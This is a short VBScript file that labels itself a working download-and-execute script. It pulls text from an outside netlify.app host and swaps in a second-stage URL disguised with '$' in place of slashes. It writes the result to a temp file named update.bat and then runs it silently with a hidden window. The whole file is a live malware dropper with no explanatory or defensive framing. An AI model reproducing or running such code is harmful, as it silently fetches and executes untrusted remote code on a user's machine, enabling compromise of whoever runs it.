' Working download and execute script
Set s = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

' Target file in temp folder
target = s.ExpandEnvironmentStrings("%TEMP%") & "\update.bat"

' Download content
Set h = CreateObject("MSXML2.ServerXMLHTTP")
h.Open "GET", "https://jade-dieffenbachia-480045.netlify.app/main.txt", False
h.Send

If h.Status = 200 Then
    content = h.ResponseText
    ' Fix the placeholder
    content = Replace(content, "****", "https:$$raw.githubusercontent.com$nytheonai-oss$hola$refs$heads$main$holaxo.txt")
    
    ' Save and run
    Set f = fs.CreateTextFile(target, True)
    f.Write content
    f.Close
    
    ' Execute with delay
    WScript.Sleep 1500
    s.Run "cmd /c """ & target & """", 0, False
End If